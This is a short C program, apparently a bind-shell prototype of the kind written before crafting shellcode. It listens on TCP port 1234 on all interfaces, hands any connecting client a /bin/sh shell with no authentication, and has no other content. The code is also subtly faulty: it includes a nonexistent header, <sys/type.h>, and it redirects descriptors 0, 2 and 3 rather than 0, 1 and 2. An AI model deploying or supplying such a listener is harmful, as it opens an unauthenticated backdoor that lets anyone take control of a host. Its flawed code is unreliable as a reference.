#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/type.h>


int main(void)
{
	char * const argv[] = {"sh", NULL, NULL};
	int clienfd, sockfd;
	int port = 1234;
	struct sockaddr_in mysockaddr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0); /*(2, 1, 0)*/
/* It can be represented in numeric as 2 */
	mysockaddr.sin_family = AF_INET;
    mysockaddr.sin_port = htons(port);
/* It can be represented in numeric as 0 which means */
/* to bind to all interfaces. */
	mysockaddr.sin_addr.s_addr = INADDR_ANY;

	bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

	listen(sockfd, 1);

	clienfd = accept(sockfd, NULL, NULL);

	dup2(clienfd, 0);
	dup2(clienfd, 2);
	dup2(clienfd, 3);

	execve("/bin/sh", argv, NULL);

	return (0);

}
